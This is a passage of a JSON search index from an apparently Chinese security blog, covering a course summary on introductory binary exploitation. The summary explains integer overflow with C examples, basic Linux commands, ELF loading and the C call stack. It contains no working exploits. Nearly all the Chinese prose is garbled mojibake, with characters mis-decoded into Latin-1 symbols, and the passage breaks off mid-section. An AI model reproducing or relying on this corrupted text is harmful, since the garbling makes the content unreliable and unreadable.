¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"å†…å­˜é‡Šæ”¾æµç¨‹ å›¾ 9ï½œProcedure of free() \" å›¾ 9ï½œProcedure of free() ","date":"2019-12-08","objectID":"/glibc-heap/:9:0","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ ¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"å‚è€ƒèµ„æ–™ Heap Exploitation Understanding glibc malloc Syscalls used by malloc glibc å†…å­˜ç®¡ç† ptmalloc æºä»£ç åˆ†æ Painless intro to the Linux userland heap ","date":"2019-12-08","objectID":"/glibc-heap/:10:0","tags":["C/C++","å †æ¼æ´"],"title":"ç›˜æ ¹é”™èŠ‚ï¼šGLibc å †å†…å­˜ç®¡ç†æœºåˆ¶ç®€ä»‹","uri":"/glibc-heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"å…¶å®æˆ‘ä¹Ÿåˆšå­¦ã€‚ æœ¬è¯¾ç¨‹ä¸»è¦ä»‹ç»å¯¹äºè¿œç¨‹æœåŠ¡è¿›è¡ŒäºŒè¿›åˆ¶å±‚é¢çš„æ¼æ´åˆ©ç”¨ï¼ˆä¹Ÿç§° Pwnï¼‰çš„åŸºç¡€æŠ€å·§ï¼Œä½¿ç”¨çš„ç¼–ç¨‹è¯­è¨€ä¸»è¦åŒ…æ‹¬ C è¯­è¨€ã€æ±‡ç¼–è¯­è¨€å’Œ Python è¯­è¨€ï¼Œæ¶‰åŠçš„å¹³å°åŒ…æ‹¬ 32 ä½ä¸ 64 ä½ Linux æ“ä½œç³»ç»Ÿã€‚å†…å®¹åŒ…å«ï¼š Pwn ç®€ä»‹ æ•´å‹æº¢å‡ºæ¼æ´ Linux åŸºç¡€ C ç¨‹åºè¿è¡Œæœºåˆ¶ C è¯­è¨€å‡½æ•°è°ƒç”¨æ ˆ ç¼“å†²åŒºæº¢å‡ºæ¼æ´â€”â€”æ ˆæº¢å‡º Pwn ç›¸å…³å·¥å…· x86(-64) æ±‡ç¼–åŸºç¡€ èŠ±å¼æ ˆæº¢å‡ºä¸æ ˆæº¢å‡ºä¿æŠ¤ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ æ—¶é—´æœ‰é™ï¼Œè¯¾ç¨‹ä»…ä»‹ç»äº†äºŒè¿›åˆ¶å®‰å…¨ä¸­æœ€åŸºç¡€çš„ä¸‰ç±»æ¼æ´åŠå…¶åˆ©ç”¨ï¼šæ•´å‹æº¢å‡ºã€æ ˆæº¢å‡ºä¸æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚ ","date":"2019-12-05","objectID":"/binary-exp/:0:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"Pwn ç®€ä»‹ ","date":"2019-12-05","objectID":"/binary-exp/:1:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ä»€ä¹ˆæ˜¯ Pwnï¼Ÿ â€œpwnâ€Â - means to compromise or control, specifically another computer (server or PC), web site, gateway device, or application. It is synonymous with one of the definitions of hacking or cracking, including iOS jailbreaking. -Â Wikipedia. ","date":"2019-12-05","objectID":"/binary-exp/:1:1","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"Pwn æ¦‚è§ˆ GLIBC Pwn Linux ä¸‹å†…å­˜ç®¡ç†ç›¸å…³ Browser Pwn æµè§ˆå™¨ç›¸å…³ Kernel Pwn Windows Kernel Linux Kernel ","date":"2019-12-05","objectID":"/binary-exp/:1:2","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"Pwn å®ä¾‹ åŒ…æ‹¬ä½†ä¸é™äºï¼šWeb æ¡†æ¶ã€OS å†…æ ¸ã€æµè§ˆå™¨ã€è·¯ç”±å™¨ç­‰è®¾å¤‡â€¦â€¦ CVE-2017-5638 Apache Struts2 è¿œç¨‹ä»£ç æ‰§è¡Œ CVE-2019-9213 Linux å†…æ ¸ç”¨æˆ·ç©ºé—´ 0 è™šæ‹Ÿåœ°å€æ˜ å°„ CVE-2019-11707 64 ä½ç«ç‹æµè§ˆå™¨ä»»æ„è¯»å†™ + ä»£ç æ‰§è¡Œ CVE-2018-5767 TENDA AC15 è·¯ç”±å™¨æƒè¿œç¨‹ä»£ç æ‰§è¡Œ â€¦â€¦ ","date":"2019-12-05","objectID":"/binary-exp/:1:3","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"æ•´å‹æº¢å‡º ä¾‹ï¼š unsigned char x = 0xff; printf(\"%d\\n\", ++x); è€ƒè™‘è¿™é‡Œçš„ ++xï¼ŒäºŒè¿›åˆ¶è¡¨ç¤ºå®é™…å°±æ˜¯ï¼š 1111 1111 + 1 = 1 0000 0000 ç„¶è€Œï¼Œunsigned char æ˜¯ 1 å­—èŠ‚å³ 8 æ¯”ç‰¹çš„ï¼Œä¸Šé¢çš„ç»“æœå´æ˜¯ 9 æ¯”ç‰¹ï¼Œé‚£ä¹ˆå¯¹äºæœ€é«˜ä½çš„ 1 åªèƒ½èˆå¼ƒï¼Œå› æ­¤æœ‰ï¼š (0xff+1) mod 256 = 0 ä¹Ÿå°±æ˜¯è¯´ï¼Œç¨‹åºçš„æ‰§è¡Œç»“æœä¸º 0ã€‚0xff è¿™æ ·çš„å¤§æ•°åŠ  1 åå˜æˆäº† 0ï¼Œæ˜¾ç„¶ä¸æ˜¯æˆ‘ä»¬é¢„æœŸçš„ç»“æœã€‚ç±»ä¼¼åœ°ï¼Œå¯¹äºï¼š signed char x = 0x7f; printf(\"%d\\n\", ++x); è¿™é‡Œçš„ ++x å°±æ˜¯ï¼š 0111 1111 + 1 = 1000 0000 å¹¸è¿çš„æ˜¯ï¼Œè¿™æ¬¡æ²¡æœ‰å‡ºç°å¤šå‡ºä¸€æ¯”ç‰¹çš„æƒ…å†µã€‚ç„¶è€Œå¯¹äº signed charï¼Œæˆ‘ä»¬çŸ¥é“å…¶æœ€é«˜ä½æ˜¯ç¬¦å·ä½ï¼Œæ¢è€Œè¨€ä¹‹æˆ‘ä»¬çš„ç»“æœæ˜¯ä¸€ä¸ªè´Ÿæ•°ã€‚ 0x7f+1 = 0x80 = -(unsigned char) 1000 0000 = -128 æ³¨æ„è¿™é‡Œçš„è¡¥ç è¿ç®—ã€‚ æ•´å‹æº¢å‡ºæ¼æ´åŸç†éå¸¸ç®€å•ï¼Œå…¶é€ æˆçš„å±å®³å´æ˜¯ååˆ†éšè”½çš„ï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬æœ‰æ—¶ä¼šè¿™æ ·å€’åºéå†å­—ç¬¦ä¸²ï¼š for (int i = strlen(s)-1; i \u003e= 0; --i) è¿™æ ·å†™ä¼šå¼•èµ·ç¼–è¯‘å™¨ warningï¼Œå› ä¸ºå°†æ— ç¬¦å·ç±»å‹è½¬æ¢åˆ°äº†æœ‰ç¬¦å·ç±»å‹ã€‚ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ strlen å‡½æ•°çš„å®šä¹‰ï¼š size_tÂ strlenÂ (const char * str) è¿”å›å€¼æ˜¯ size_t ç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥å°†å®ƒç­‰æ•ˆä¸º unsigned int ç±»å‹ã€‚ ç°åœ¨è€ƒè™‘ s æ˜¯ä¸€ä¸ªç©ºä¸²æ—¶çš„æƒ…å†µï¼Œè¿™æ—¶ i çš„åˆå§‹å€¼æ˜¯ä»€ä¹ˆï¼Ÿ ä½ å¯èƒ½ä¼šè®¤ä¸ºæ˜¯ - 1ã€‚å®é™…ä¸Šï¼Œç”±äº strlen çš„è¿”å›å€¼æ˜¯æ— ç¬¦å·çš„ï¼Œé‚£ä¹ˆå®ƒå‡ 1 çš„ç»“æœåŒæ ·ä¼šè¢«è®¤ä¸ºæ˜¯æ— ç¬¦å·çš„ï¼Œé‚£ä¹ˆ i è¢«èµ‹å€¼çš„å®é™…ä¸Šæ˜¯ (size_t)(-1)ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ­£æ•°ã€‚æ­¤æ—¶å¿…ç„¶ä¼šå‘ç”Ÿæ•°ç»„è¶Šç•Œã€‚ ä¸€ä¸ªæ›´å¸¸è§çš„é”™è¯¯æ˜¯è¿™æ ·çš„ï¼š int binary_search(int a[], int len, int key) { int low = 0; int high = len - 1; while (low\u003c=high) { int mid = (low + high)/2; if (a[mid] == key) { return mid; } if (key \u003c a[mid]) { high = mid - 1; }else{ low = mid + 1; } } return -1; } è¿™ä¸å°±æ˜¯æœ€æ™®é€šçš„äºŒåˆ†æŸ¥æ‰¾å†™æ³•å—ï¼Ÿçš„ç¡®ï¼Œä½†æ˜¯å³ä½¿æˆ‘ä»¬ç¡®ä¿ low å’Œ high ä¸æº¢å‡ºï¼Œlow+high çš„ç»“æœä¾ç„¶å¯èƒ½æº¢å‡ºï¼Œè€Œæ­¤æ—¶ mid ä¼šå˜æˆä¸€ä¸ªè´Ÿæ•°ï¼Œé€ æˆè¶Šç•Œã€‚ è€Œä¸”ï¼Œæ•´å‹æº¢å‡ºä¸ä»…åœ¨ C è¯­è¨€ä¸­å­˜åœ¨ã€‚åœ¨æœ€è¿‘çš„ä¸€æ¬¡ ä¸­ç§‘å¤§æ¯”èµ› ä¸­æˆ‘ä»¬å°±é‡åˆ°äº†å¯¹ js æ•´å‹æº¢å‡ºçš„åˆ©ç”¨ã€‚ ","date":"2019-12-05","objectID":"/binary-exp/:2:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"Linux åŸºç¡€ è¯¾ç¨‹çš„ç¬¬äºŒéƒ¨åˆ†ä»‹ç»äº†ä¸€äº› Linux ç›¸å…³åŸºç¡€ã€‚Linux æ˜¯ä¸€ä¸ªå¼€æºçš„ OS å†…æ ¸ï¼ŒåŸºäº C å’Œæ±‡ç¼–ç¼–å†™ï¼Œå¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼æ˜¯ ELF æ ¼å¼ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬åé¢è¦ä¸»è¦ç ”ç©¶çš„ã€‚è¿™é‡Œé™„ä¸Šä¸€ä¸ªéå¸¸æœ‰è¶£çš„ Linux ç»ƒä¹ ç½‘ç«™ã€‚ å®‰è£…ä¸é…ç½®è¯·è‡ªè¡Œæœç´¢ï¼Œæ¨èä½¿ç”¨è™šæ‹Ÿæœºå®‰è£…ã€‚è¯¾ç¨‹ä½¿ç”¨çš„å‘è¡Œç‰ˆæ˜¯ Ubuntu 16.04LTSï¼Œä¸è¿‡æœ€è¿‘å‘ç°å“ˆä½›çš„ CS50 IDE ä¹Ÿéå¸¸å¥½ç”¨ã€‚ ä¸‹é¢æ˜¯ä¸€äº›åŸºç¡€ Linux å‘½ä»¤ï¼š ","date":"2019-12-05","objectID":"/binary-exp/:3:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ç›®å½•ç®¡ç† ls åˆ—å‡ºå½“å‰ç›®å½•ä¸‹æ–‡ä»¶ -a åˆ—å‡ºæ‰€æœ‰æ–‡ä»¶ï¼ˆåŒ…æ‹¬éšè—çš„ï¼‰ -l è¯¦ç»†ä¿¡æ¯ cd [path] æ”¹å˜ç›®å½•åˆ° path . å½“å‰ç›®å½• .. ä¸Šçº§ç›®å½• pwd æ˜¾ç¤ºå½“å‰ç›®å½• ","date":"2019-12-05","objectID":"/binary-exp/:3:1","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"æ–‡ä»¶æ“ä½œ cat [file] æ˜¾ç¤ºæ–‡ä»¶ file çš„å†…å®¹ more [file] ç±»ä¼¼ catï¼Œä½†å¯¹äºé•¿æ–‡ä»¶å¯ä»¥åˆ†é¡µæ˜¾ç¤º mv [file1] [file2] æŠŠ file1 ç§»åŠ¨åˆ° file2ï¼Œå¦‚æœåè€…å·²å­˜åœ¨åˆ™è¦†ç›– cp [file1] [file2] å°† file1 å¤åˆ¶åˆ° file2ï¼Œå¦‚æœåè€…å·²å­˜åœ¨åˆ™è¦†ç›– rm [file] åˆ é™¤æ–‡ä»¶ file touch [file] åˆ›å»ºæ–‡ä»¶ fileï¼Œæˆ–æ›´æ–°æ–‡ä»¶ file çš„ä¿®æ”¹æ—¶é—´ mkdir [directory] åˆ›å»ºç›®å½• directory chmod [file] æ”¹å˜æ–‡ä»¶ file çš„æƒé™ ","date":"2019-12-05","objectID":"/binary-exp/:3:2","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ç”¨æˆ·ç®¡ç† sudo ä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡Œå‘½ä»¤ su [user] åˆ‡æ¢åˆ°ç”¨æˆ· user whoami æ˜¾ç¤ºå½“å‰ç”¨æˆ·ç”¨æˆ·å id æ˜¾ç¤ºå½“å‰ç”¨æˆ· ID å’Œæ‰€åœ¨ç”¨æˆ·ç»„ ID passwd æ›´æ”¹å½“å‰ç”¨æˆ·å¯†ç  ","date":"2019-12-05","objectID":"/binary-exp/:3:3","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"å·¥ä½œå‘½ä»¤ date æ˜¾ç¤ºå½“å‰ç³»ç»Ÿæ—¶é—´ ps æ˜¾ç¤ºå½“å‰è¿è¡Œè¿›ç¨‹ uname æ˜¾ç¤ºç³»ç»Ÿç›¸å…³ä¿¡æ¯ echo \"hello\" åœ¨ç»ˆç«¯ä¸­æ˜¾ç¤º hello echo $((0xDEADBEEF)) grep \"hello\" æŸ¥æ‰¾å«æœ‰ hello çš„è¡Œå¹¶æ˜¾ç¤º ","date":"2019-12-05","objectID":"/binary-exp/:3:4","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ç‰¹æ€§ ç®¡é“ï¼šä»ä¸€ä¸ªç¨‹åºä¸­è·å–è¾“å‡ºï¼Œä½œä¸ºå¦ä¸€ä¸ªç¨‹åºçš„è¾“å…¥ echo \"hello\" | /usr/games/cowsay echo \"hello\" | /usr/games/cowsay | grep \"hello\" é‡å®šå‘ï¼šæŒ‡å®šè¾“å…¥è¾“å‡ºçš„æ¥æºï¼Œè€Œä¸æ˜¯ç›´æ¥è¯» stdin å†™ stdout echo \"hello\" | /usr/games/cowsay \u003e cowsay echo \"hello\" \u003e cowsay echo \"hello\" \u003e\u003e cowsay man [command] æ˜¾ç¤ºå‘½ä»¤ command çš„è¯´æ˜ æ–¹å‘ â†‘ é”®ï¼šä¸Šä¸€æ¡å‘½ä»¤ Tab é”®ï¼šè‡ªåŠ¨è¡¥å…¨å‘½ä»¤ è¿™é‡Œé€šè¿‡ pwnable.kr ä¸Šçš„ cmd1ï¼Œcmd2 å’Œ blukat ä¸‰é¢˜ï¼Œæ¼”ç¤ºäº† Linux ä¸‹çš„ä¸€äº›å°æŠŠæˆã€‚ ","date":"2019-12-05","objectID":"/binary-exp/:3:5","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"C ç¨‹åºè¿è¡Œæœºåˆ¶ ä»¥ Hello World ç¨‹åºä¸ºä¾‹ï¼š #include \u003cstdio.h\u003e int main(int argc, char *argv[]) { printf(\"Hello World!\\n\"); return 0; } è¿™ä¸ªç¨‹åºåˆ°åº•æ˜¯æ€ä¹ˆè¿è¡Œèµ·æ¥çš„ï¼Ÿæˆ‘ä»¬åˆ†ä¸‰æ­¥ä»‹ç»ï¼š æºä»£ç è¢«ç¼–è¯‘ä¸ºæœºå™¨è¯­è¨€ï¼Œéšåæ±‡ç¼–ä¸ºç›®æ ‡æ–‡ä»¶ ç›®æ ‡æ–‡ä»¶ä¸­å¼•å…¥ç›¸å…³ä¾èµ–ï¼Œé“¾æ¥ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆELFï¼‰ å¯æ‰§è¡Œæ–‡ä»¶è½½å…¥å†…å­˜å¹¶è¿è¡Œ å›¾ 1 \" å›¾ 1 ç¼–è¯‘ä¸€ä¸ªç¨‹åºéå¸¸ç®€å•ï¼Œå¦‚æœä½ çš„æºä»£ç æ˜¯ 1.cï¼Œé‚£ä¹ˆåªéœ€è¦ gcc 1.c å°±èƒ½ç”Ÿæˆä¸€ä¸ªå«åš a.out çš„ ELF æ–‡ä»¶ï¼Œä½ ä¹Ÿå¯ä»¥ç”¨ -o é€‰é¡¹æ¥è®¾ç½® ELF æ–‡ä»¶çš„åå­—ã€‚ æˆ‘ä»¬æ‰€è¦ç ”ç©¶çš„å°±æ˜¯ ELF æ–‡ä»¶ä¸­ç©¶ç«Ÿæœ‰ä»€ä¹ˆã€‚é¦–å…ˆæ˜¯ ELF æ–‡ä»¶å¤´ï¼ŒåŒ…å«äº† ELF æ–‡ä»¶çš„è®¸å¤šå…ƒæ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ readelf -h a.out æ¥æŸ¥çœ‹ï¼š å›¾ 2 \" å›¾ 2 ELF æ–‡ä»¶çš„å†…å®¹åˆ™æ˜¯ç”±ä¸€ä¸ªä¸ªæ®µ (segment) ç»„æˆçš„ï¼Œå¦‚ï¼š æ–‡æœ¬æ®µ text segment ç¨‹åºçš„ä»£ç å°±åœ¨è¿™é‡Œ æ•°æ®æ®µ data segment å­˜å‚¨äº†ç¨‹åºä¸­å˜é‡çš„æ•°æ®ç­‰ç­‰ é‡å®šä½æ®µ reloc åŒ…å«é‡å®šä½ä¿¡æ¯ï¼Œä¹‹åä¼šå…·ä½“è®¨è®º ç¬¦å·è¡¨ symbol table å­˜å‚¨äº†å˜é‡åã€å‡½æ•°åç­‰ä¿¡æ¯ å­—ç¬¦ä¸²è¡¨ string table å­˜å‚¨äº†åªè¯»å­—ç¬¦ä¸²ç­‰ä¿¡æ¯ objdump -s a.out å¯ä»¥å¸®åŠ©æˆ‘ä»¬æŸ¥çœ‹è¿™äº›æ®µçš„ä¿¡æ¯ï¼š å›¾ 3 \" å›¾ 3 è€Œå¦‚æœè¦æŸ¥çœ‹å…¶ä¸­çš„æ±‡ç¼–ä»£ç ï¼Œå°±éœ€è¦é  objdump -d a.out äº†ï¼š å›¾ 4 \" å›¾ 4 æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œä¸Šå›¾ä¸­ put@plt çš„åœ°å€æ˜¯ ff ffï¼Œè¿™æ˜¯å› ä¸ºç¨‹åºè¿˜æ²¡æœ‰è¿›è¡Œç¬¬äºŒæ­¥â€”â€”é“¾æ¥ã€‚ç°åœ¨çš„ C ç¨‹åºé»˜è®¤é‡‡ç”¨åŠ¨æ€é“¾æ¥çš„æ–¹å¼ï¼Œæ˜¯å› ä¸ºä¼ ç»Ÿé™æ€é“¾æ¥å®¹æ˜“é€ æˆé‡å¤é“¾æ¥æ¯”è¾ƒæµªè´¹ï¼ŒåŒæ—¶ä¹Ÿååˆ†éš¾ç»´æŠ¤ã€‚è€ŒåŠ¨æ€é“¾æ¥ä¼šåœ¨è¿è¡Œæ—¶æ‰è¿›è¡Œé“¾æ¥ã€‚ æœ€åï¼Œå½“æˆ‘ä»¬ ./a.out è¿è¡Œç¨‹åºæ—¶ï¼Œå¯æ‰§è¡Œæ–‡ä»¶ä¼šè¢«è½½å…¥å†…å­˜ï¼Œä¸åŒçš„æ®µå°†è¢«åˆ†é…ä¸åŒçš„è™šæ‹Ÿåœ°å€ï¼Œå¹¶æ˜ å°„åˆ°å¯¹åº”çš„ç‰©ç†åœ°å€ã€‚å½“ç¨‹åºè®¡æ•°å™¨æŒ‡å‘äº†ä»£ç æ®µçš„èµ·å§‹ä½ç½®ä¹‹åï¼Œæˆ‘ä»¬çš„ç¨‹åºä¹Ÿå°±å‡†å¤‡å¥½å¼€å§‹è¿è¡Œäº†ã€‚ å›¾ 5 \" å›¾ 5 ä¸Šå›¾å±•ç¤ºäº†è™šæ‹Ÿåœ°å€æ˜¯å¦‚ä½•æ˜ å°„åˆ°ç‰©ç†åœ°å€çš„ï¼ŒåŒæ—¶ä¹Ÿå±•ç¤ºå‡º ELF æ–‡ä»¶ä¸­çš„ä¸¤ä¸ªç‰¹æ®Šçš„æ®µï¼šheap æ®µä¸ stack æ®µçš„ç”Ÿé•¿æ–¹å¼ã€‚å¯ä»¥çœ‹åˆ°ï¼Œå †æ˜¯ä»ä½åœ°å€å‘é«˜åœ°å€ç”Ÿé•¿çš„ï¼Œè€Œæ ˆæ˜¯ä»é«˜åœ°å€å‘ä½åœ°å€ç”Ÿé•¿ã€‚ä½†æ˜¯ï¼Œæ•°æ®çš„å­˜å‚¨å´æ˜¯ä»ä½åœ°å€å‘é«˜åœ°å€å­˜å‚¨ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬èƒ½å¤Ÿå®æ–½æ ˆæº¢å‡ºæ”»å‡»çš„åŸºç¡€ã€‚ ","date":"2019-12-05","objectID":"/binary-exp/:4:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"C è¯­è¨€å‡½æ•°è°ƒç”¨æ ˆ C ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œä¼šæŒç»­åœ°ç»´æŠ¤è¿™ä¸ª stack æ®µä¹Ÿå°±æ˜¯æ ˆï¼Œç”¨æ¥æ§åˆ¶å‡½æ•°è°ƒç”¨çš„æµç¨‹ã€‚å½“å‘ç”Ÿå‡½æ•°è°ƒç”¨æ—¶ï¼Œæ ˆçš„ä¸»è¦ä»»åŠ¡æ˜¯ä¿å­˜è°ƒç”¨è€…å‡½æ•° caller çš„çŠ¶æ€ï¼Œå¹¶åˆ›å»ºè¢«è°ƒç”¨å‡½æ•° callee çš„çŠ¶æ€ï¼Œè¿™é‡Œçš„ â€œçŠ¶æ€â€ åœ¨æ ˆä¸Šè¢«ç§°ä¸ºæ ˆå¸§ï¼Œæ¯ä¸ªæ ˆå¸§ä¹‹é—´æ˜¯ç›¸äº’ç‹¬ç«‹çš„ã€‚ å›¾ 6 \" å›¾ 6 ","date":"2019-12-05","objectID":"/binary-exp/:5:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"è°ƒç”¨ åœ¨è°ƒç”¨ä¸€ä¸ªå‡½æ•°æ—¶ï¼Œé¦–å…ˆä¼šå°†å‡½æ•°çš„å‚æ•°æŒ‰å€’åºå‹å…¥æ ˆä¸­ï¼š å›¾ 7 \" å›¾ 7 æ³¨æ„å›¾ä¸­æ ˆæ˜¯å‘ä¸‹ç”Ÿé•¿çš„ï¼Œä¸‹é¢çš„ esp å¯„å­˜å™¨æŒ‡å‘æ ˆé¡¶ï¼Œè€Œä¸Šé¢çš„ ebp å¯„å­˜å™¨æŒ‡å‘å½“å‰è¿è¡Œå‡½æ•°çš„æ ˆå¸§çš„åº•éƒ¨ï¼Œä¹Ÿå°±æ˜¯æ ˆå¸§å¼€å§‹çš„åœ°æ–¹ã€‚ æ¥ä¸‹æ¥å‹å…¥å‡½æ•°è¿”å›åœ°å€ã€‚å½“å‡½æ•°è°ƒç”¨ç»“æŸåï¼Œå‡½æ•°å¿…å®šéœ€è¦è¿”å›åˆ°è°ƒç”¨å®ƒçš„è¯­å¥çš„ä¸‹ä¸€å¥å¤„ï¼Œä½†æ˜¯å®ƒæ€ä¹ˆçŸ¥é“å®ƒè¦è¿”å›åˆ°å“ªé‡Œï¼Ÿè¿™åªèƒ½ç”±æˆ‘ä»¬å‘Šè¯‰ä»–ï¼Œæ–¹å¼å°±æ˜¯å­˜å‚¨åˆ°æ ˆä¸Šã€‚ å›¾ 8 \" å›¾ 8 è¿™é‡Œå­˜å‚¨åˆ°æ ˆä¸Šçš„å€¼å®é™…ä¸Šå°±æ˜¯ caller çš„ eipã€‚eip å¯„å­˜å™¨ä¿å­˜äº† CPU å½“å‰æ‰§è¡Œçš„æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚ éšåï¼Œæˆ‘ä»¬å‹å…¥ caller çš„ ebpï¼Œå¹¶æ›´æ–° ebp çš„å€¼ã€‚åè€…å¾ˆå¥½ç†è§£ï¼Œå› ä¸ºæˆ‘ä»¬ç°åœ¨è¿›å…¥åˆ°äº† callee è¿™ä¸ªå‡½æ•°äº†ï¼Œæ ˆå¸§åŸºå€å½“ç„¶ä¹Ÿè¦è·Ÿç€å˜åŒ–ï¼Œé‚£ä¹ˆå‰è€…æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬ä¼šåœ¨å‡½æ•°è¿”å›æ—¶å‘ç°è¿™æ ·åšçš„åŸå› ã€‚ æœ€åå°±æ˜¯å‹å…¥å±€éƒ¨å˜é‡äº†ï¼Œè¿™ä¸€æ­¥æ²¡æœ‰å¤ªå¤šå¯ä»¥è§£é‡Šçš„ã€‚ å›¾ 9 \" å›¾ 9 ","date":"2019-12-05","objectID":"/binary-exp/:5:1","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb"],"title":"æ°´æ¼«é‡‘å±±ï¼šã€ŠäºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨å…¥é—¨ã€‹è¯¾ç¨‹æ€»ç»“","uri":"/binary-exp/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"è¿”å› 